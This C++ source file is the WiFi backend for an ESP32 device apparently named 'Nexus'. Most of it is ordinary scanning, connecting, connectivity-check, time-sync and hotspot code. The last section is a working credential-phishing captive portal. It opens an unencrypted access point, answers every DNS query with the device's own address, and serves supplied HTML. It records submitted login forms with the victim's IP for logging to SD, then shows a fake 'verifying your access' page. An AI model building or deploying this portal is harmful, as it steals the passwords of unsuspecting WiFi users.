// wifi_net.cpp -- WiFi backend for Nexus. Lazy init/teardown; STA scan+connect,
// internet reachability probe, SoftAP hotspot. Single radio at a time.
#include "wifi_net.h"
#include <string.h>
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "esp_sntp.h"
#include "esp_http_server.h"
#include <time.h>
#include <stdlib.h>

#define BIT_CONNECTED  (1 << 0)
#define BIT_FAIL       (1 << 1)

static bool                g_running = false;
static bool                g_ap_mode = false;
static bool                g_have_ip = false;
static wifi_mode_t         g_mode    = WIFI_MODE_NULL;
static esp_netif_t*        g_sta = 0;
static esp_netif_t*        g_ap  = 0;
static EventGroupHandle_t  g_eg  = 0;
static esp_event_handler_instance_t g_h_wifi = 0;
static esp_event_handler_instance_t g_h_ip   = 0;
static esp_netif_ip_info_t g_ipinfo;

static void on_evt(void* arg, esp_event_base_t base, int32_t id, void* data) {
  (void)arg;
  if (base == WIFI_EVENT) {
    if (id == WIFI_EVENT_STA_DISCONNECTED) {
      g_have_ip = false;
      if (g_eg) xEventGroupSetBits(g_eg, BIT_FAIL);
    }
  } else if (base == IP_EVENT) {
    if (id == IP_EVENT_STA_GOT_IP) {
      ip_event_got_ip_t* e = (ip_event_got_ip_t*)data;
      g_ipinfo  = e->ip_info;
      g_have_ip = true;
      if (g_eg) xEventGroupSetBits(g_eg, BIT_CONNECTED);
    }
  }
}

bool wifi_net_running(void) { return g_running; }
size_t wifi_net_free_heap(void) { return esp_get_free_heap_size(); }

bool wifi_net_start(void) {
  if (g_running) return true;
  esp_err_t e = esp_netif_init();
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return false;
  e = esp_event_loop_create_default();
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return false;
  g_sta = esp_netif_create_default_wifi_sta();
  g_ap  = esp_netif_create_default_wifi_ap();
  if (!g_sta || !g_ap) {
    if (g_sta) { esp_netif_destroy_default_wifi(g_sta); g_sta = 0; }
    if (g_ap)  { esp_netif_destroy_default_wifi(g_ap);  g_ap = 0; }
    return false;
  }
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  if (esp_wifi_init(&cfg) != ESP_OK) {
    if (g_sta) { esp_netif_destroy_default_wifi(g_sta); g_sta = 0; }
    if (g_ap)  { esp_netif_destroy_default_wifi(g_ap);  g_ap  = 0; }
    return false;
  }
  g_eg = xEventGroupCreate();
  // Mark owned resources before registration so partial failures use one cleanup.
  g_running = true;
  if (!g_eg ||
      esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                          on_evt, 0, &g_h_wifi) != ESP_OK ||
      esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                          on_evt, 0, &g_h_ip) != ESP_OK ||
      esp_wifi_set_storage(WIFI_STORAGE_RAM) != ESP_OK) {
    wifi_net_stop();
    return false;
  }
  g_mode    = WIFI_MODE_NULL;
  g_ap_mode = false;
  g_have_ip = false;
  return true;
}

void wifi_net_stop(void) {
  if (!g_running) return;
  esp_wifi_stop();
  esp_wifi_deinit();
  if (g_h_wifi) {
    esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, g_h_wifi);
    g_h_wifi = 0;
  }
  if (g_h_ip) {
    esp_event_handler_instance_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, g_h_ip);
    g_h_ip = 0;
  }
  if (g_sta) { esp_netif_destroy_default_wifi(g_sta); g_sta = 0; }
  if (g_ap)  { esp_netif_destroy_default_wifi(g_ap);  g_ap  = 0; }
  if (g_eg)  { vEventGroupDelete(g_eg); g_eg = 0; }
  g_running = false;
  g_mode    = WIFI_MODE_NULL;
  g_ap_mode = false;
  g_have_ip = false;
}

static void enter_sta(void) {
  if (g_mode != WIFI_MODE_NULL) esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  g_mode    = WIFI_MODE_STA;
  g_ap_mode = false;
}

int wifi_net_scan(wifi_ap_t* out, int max) {
  if (!g_running || !out || max <= 0) return 0;
  enter_sta();
  wifi_scan_config_t sc = {};
  sc.show_hidden = false;
  if (esp_wifi_scan_start(&sc, true) != ESP_OK) return 0;
  uint16_t n = 0;
  if (esp_wifi_scan_get_ap_num(&n) != ESP_OK || n == 0) {
    esp_wifi_clear_ap_list();
    return 0;
  }
  wifi_ap_record_t* recs =
      (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * n);
  if (!recs) { esp_wifi_clear_ap_list(); return 0; }
  if (esp_wifi_scan_get_ap_records(&n, recs) != ESP_OK) {
    free(recs);
    esp_wifi_clear_ap_list();
    return 0;
  }
  int cnt = 0;
  for (int i = 0; i < (int)n && cnt < max; i++) {
    const char* s = (const char*)recs[i].ssid;
    if (s[0] == 0) continue;              /* skip hidden/empty */
    strncpy(out[cnt].ssid, s, WIFI_SSID_MAX - 1);
    out[cnt].ssid[WIFI_SSID_MAX - 1] = 0;
    memcpy(out[cnt].bssid, recs[i].bssid, 6);
    out[cnt].rssi     = recs[i].rssi;
    out[cnt].channel  = recs[i].primary;
    out[cnt].authmode = recs[i].authmode;
    cnt++;
  }
  free(recs);
  return cnt;
}

int wifi_net_connect(const char* ssid, const char* pass, int timeout_ms) {
  if (!g_running || !ssid) return 0;
  enter_sta();
  wifi_config_t wc = {};
  strncpy((char*)wc.sta.ssid, ssid, sizeof(wc.sta.ssid) - 1);
  if (pass && pass[0])
    strncpy((char*)wc.sta.password, pass, sizeof(wc.sta.password) - 1);
  wc.sta.threshold.authmode = WIFI_AUTH_OPEN;  /* accept any >= open */
  esp_wifi_set_config(WIFI_IF_STA, &wc);
  if (g_eg) xEventGroupClearBits(g_eg, BIT_CONNECTED | BIT_FAIL);
  g_have_ip = false;
  esp_wifi_connect();
  EventBits_t b = xEventGroupWaitBits(g_eg, BIT_CONNECTED | BIT_FAIL,
                                      pdFALSE, pdFALSE,
                                      pdMS_TO_TICKS(timeout_ms));
  return (b & BIT_CONNECTED) ? 1 : 0;
}

void wifi_net_disconnect(void) {
  if (!g_running) return;
  esp_wifi_disconnect();
  esp_wifi_stop();
  g_mode    = WIFI_MODE_NULL;
  g_have_ip = false;
}

bool wifi_net_sta_ipinfo(char* ip, char* gw, int len) {
  if (!g_have_ip) return false;
  if (ip) esp_ip4addr_ntoa(&g_ipinfo.ip, ip, len);
  if (gw) esp_ip4addr_ntoa(&g_ipinfo.gw, gw, len);
  return true;
}

int wifi_net_rssi(void) {
  if (!g_have_ip) return 0;
  wifi_ap_record_t ap;
  if (esp_wifi_sta_get_ap_info(&ap) != ESP_OK) return 0;
  return ap.rssi;
}

int wifi_net_check_internet(void) {
  if (!g_have_ip) return 0;
  struct addrinfo hints = {};
  struct addrinfo* res = 0;
  hints.ai_family   = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  if (getaddrinfo("connectivitycheck.gstatic.com", "80", &hints, &res) != 0 || !res) {
    if (res) freeaddrinfo(res);
    return 0;  /* DNS failed => no usable internet */
  }
  int s = socket(res->ai_family, res->ai_socktype, 0);
  if (s < 0) { freeaddrinfo(res); return 0; }
  struct timeval tv; tv.tv_sec = 5; tv.tv_usec = 0;
  setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  int ok = 0;
  if (connect(s, res->ai_addr, res->ai_addrlen) == 0) {
    const char* req =
        "GET /generate_204 HTTP/1.1\r\n"
        "Host: connectivitycheck.gstatic.com\r\n"
        "Connection: close\r\n\r\n";
    send(s, req, strlen(req), 0);
    char buf[64] = {0};
    int r = recv(s, buf, sizeof(buf) - 1, 0);
    if (r > 12 && strstr(buf, " 204")) ok = 1;  /* 204 => real internet */
  }
  close(s);
  freeaddrinfo(res);
  return ok;
}

bool wifi_net_ap_start(const char* ssid, const char* pass) {
  if (!g_running || !ssid || !ssid[0]) return false;
  if (g_mode != WIFI_MODE_NULL) esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t wc = {};
  strncpy((char*)wc.ap.ssid, ssid, sizeof(wc.ap.ssid) - 1);
  wc.ap.ssid_len       = strlen((char*)wc.ap.ssid);
  wc.ap.channel        = 6;
  wc.ap.max_connection = 4;
  wc.ap.beacon_interval = 100;
  if (pass && strlen(pass) >= 8) {
    strncpy((char*)wc.ap.password, pass, sizeof(wc.ap.password) - 1);
    wc.ap.authmode = WIFI_AUTH_WPA2_PSK;
  } else {
    wc.ap.authmode = WIFI_AUTH_OPEN;
  }
  esp_wifi_set_config(WIFI_IF_AP, &wc);
  if (esp_wifi_start() != ESP_OK) return false;
  g_mode    = WIFI_MODE_AP;
  g_ap_mode = true;
  return true;
}

void wifi_net_ap_stop(void) {
  if (!g_running) return;
  esp_wifi_stop();
  g_mode    = WIFI_MODE_NULL;
  g_ap_mode = false;
}

int wifi_net_ap_clients(void) {
  if (!g_ap_mode) return 0;
  wifi_sta_list_t list;
  if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return 0;
  return list.num;
}

bool wifi_net_ap_ipinfo(char* ip, int len) {
  if (!g_ap_mode || !g_ap) return false;
  esp_netif_ip_info_t info;
  if (esp_netif_get_ip_info(g_ap, &info) != ESP_OK) return false;
  if (ip) esp_ip4addr_ntoa(&info.ip, ip, len);
  return true;
}

const char* wifi_net_auth_str(uint8_t a) {
  switch ((wifi_auth_mode_t)a) {
    case WIFI_AUTH_OPEN:            return "open";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
    default:                        return "sec";
  }
}

bool wifi_net_sntp_sync(char* out, int len) {
  if (!g_have_ip) return false;
  esp_sntp_setoperatingmode(ESP_SNTP_OPMODE_POLL);
  esp_sntp_setservername(0, "pool.ntp.org");
  esp_sntp_init();
  setenv("TZ", "IST-5:30", 1);
  tzset();
  time_t now = 0;
  struct tm ti = {};
  int tries = 0;
  while (tries++ < 25) {
    vTaskDelay(pdMS_TO_TICKS(300));
    time(&now);
    localtime_r(&now, &ti);
    if (ti.tm_year > (2020 - 1900)) break;
  }
  esp_sntp_stop();
  if (ti.tm_year <= (2020 - 1900)) return false;
  strftime(out, len, "%Y-%m-%d\n%H:%M:%S IST", &ti);
  return true;
}

// ---------- Captive portal ----------
static httpd_handle_t g_httpd = 0;
static const char*    g_cp_html = 0;
static int            g_cp_html_len = 0;
static volatile int   g_cp_hits = 0;
static TaskHandle_t   g_dns_task = 0;
static volatile bool  g_dns_run = false;
static volatile int   g_cp_caps = 0;    // form submissions captured
static void (*g_cp_cap_cb)(const char* body, const char* ip) = 0;

void wifi_net_cp_set_capture(void (*cb)(const char* body, const char* ip)) {
  g_cp_cap_cb = cb;
}

static esp_err_t cp_get_handler(httpd_req_t* req) {
  g_cp_hits++;
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
  if (g_cp_html && g_cp_html_len > 0)
    httpd_resp_send(req, g_cp_html, g_cp_html_len);
  else
    httpd_resp_send(req, "<html><body>Nexus Captive Portal</body></html>",
                    HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}

// Capture a submitted login form. Reads the urlencoded body, grabs the client
// IP, hands both to the registered callback (which logs to SD), then returns a
// plausible "connecting" page.
static esp_err_t cp_post_handler(httpd_req_t* req) {
  char body[513];
  int total = 0, rem = req->content_len;
  if (rem > (int)sizeof(body) - 1) rem = (int)sizeof(body) - 1;
  while (rem > 0) {
    int r = httpd_req_recv(req, body + total, rem);
    if (r <= 0) { if (r == HTTPD_SOCK_ERR_TIMEOUT) continue; break; }
    total += r; rem -= r;
  }
  body[total] = 0;
  char ip[20] = "?";
  int sock = httpd_req_to_sockfd(req);
  if (sock >= 0) {
    struct sockaddr_in6 sa; socklen_t sl = sizeof(sa);
    if (getpeername(sock, (struct sockaddr*)&sa, &sl) == 0) {
      struct sockaddr_in* s4 = (struct sockaddr_in*)&sa;
      inet_ntoa_r(s4->sin_addr, ip, sizeof(ip));
    }
  }
  if (total > 0) { g_cp_caps++; if (g_cp_cap_cb) g_cp_cap_cb(body, ip); }
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
  httpd_resp_send(req,
    "<html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "</head><body style=\"font-family:sans-serif;text-align:center;padding-top:40px\">"
    "<h3>Connecting...</h3><p>Please wait while we verify your access.</p></body></html>",
    HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}

static void dns_task(void* arg) {
  (void)arg;
  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock < 0) { g_dns_task = 0; vTaskDelete(NULL); return; }
  struct sockaddr_in sa = {};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(53);
  sa.sin_addr.s_addr = htonl(INADDR_ANY);
  if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    close(sock); g_dns_task = 0; vTaskDelete(NULL); return;
  }
  struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  uint8_t buf[256];
  while (g_dns_run) {
    struct sockaddr_in from; socklen_t fl = sizeof(from);
    int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr*)&from, &fl);
    if (n < 12) continue;
    buf[2] |= 0x80;            /* QR = response */
    buf[3]  = 0x00;            /* RA/Z/RCODE = 0 */
    buf[6]  = 0x00; buf[7] = 0x01;  /* ANCOUNT = 1 */
    if (n + 16 > (int)sizeof(buf)) continue;
    int p = n;
    buf[p++] = 0xC0; buf[p++] = 0x0C;             /* name -> offset 12 */
    buf[p++] = 0x00; buf[p++] = 0x01;             /* type A */
    buf[p++] = 0x00; buf[p++] = 0x01;             /* class IN */
    buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x3C; /* TTL 60 */
    buf[p++] = 0x00; buf[p++] = 0x04;             /* RDLENGTH 4 */
    buf[p++] = 192; buf[p++] = 168; buf[p++] = 4; buf[p++] = 1;  /* 192.168.4.1 */
    sendto(sock, buf, p, 0, (struct sockaddr*)&from, fl);
  }
  close(sock);
  g_dns_task = 0;
  vTaskDelete(NULL);
}

bool wifi_net_cp_start(const char* ssid, const char* html, int htmllen) {
  if (!g_running || !ssid || !ssid[0]) return false;
  if (!wifi_net_ap_start(ssid, "")) return false;   /* open AP */
  g_cp_html = html; g_cp_html_len = htmllen; g_cp_hits = 0;
  httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
  hc.uri_match_fn     = httpd_uri_match_wildcard;
  hc.max_uri_handlers = 8;
  hc.lru_purge_enable = true;
  g_cp_caps = 0;
  if (httpd_start(&g_httpd, &hc) != ESP_OK) { wifi_net_ap_stop(); return false; }
  httpd_uri_t u = {};
  u.uri = "/*"; u.method = HTTP_GET; u.handler = cp_get_handler;
  httpd_register_uri_handler(g_httpd, &u);
  httpd_uri_t up = {};
  up.uri = "/*"; up.method = HTTP_POST; up.handler = cp_post_handler;
  httpd_register_uri_handler(g_httpd, &up);
  g_dns_run = true;
  if (xTaskCreate(dns_task, "cp_dns", 3072, 0, 5, &g_dns_task) != pdPASS)
    g_dns_task = 0;
  return true;
}

void wifi_net_cp_stop(void) {
  g_dns_run = false;
  if (g_httpd) { httpd_stop(g_httpd); g_httpd = 0; }
  for (int i = 0; i < 30 && g_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));
  wifi_net_ap_stop();
  g_cp_html = 0; g_cp_html_len = 0;
}

int wifi_net_cp_hits(void) { return g_cp_hits; }
int wifi_net_cp_caps(void) { return g_cp_caps; }
